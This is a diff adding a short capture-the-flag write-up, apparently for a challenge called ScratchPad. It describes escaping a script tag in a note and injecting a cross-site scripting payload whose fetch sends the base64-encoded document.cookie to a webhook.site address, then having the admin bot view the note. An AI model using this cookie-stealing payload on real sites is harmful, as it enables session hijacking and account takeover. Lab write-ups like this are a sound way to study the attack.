@@ -1,0 +1,2 @@
+ScratchPad -> The note body is redirected using a <script> tag. We can escape from this tag inserting an initial </script> inside our note. After that we can use our <script> tag, with a fetch inside it.  <script>fetch(`https://webhook.site/3056ed01-9288-4df2-8d98-1f21d274a20a?cookie=`+btoa(document.cookie))</script>  after that we paste the url of that specific note to the section dedicated to “report to admin”. This will render the page and execute the script, that will send the admin cookie to web hook.
+
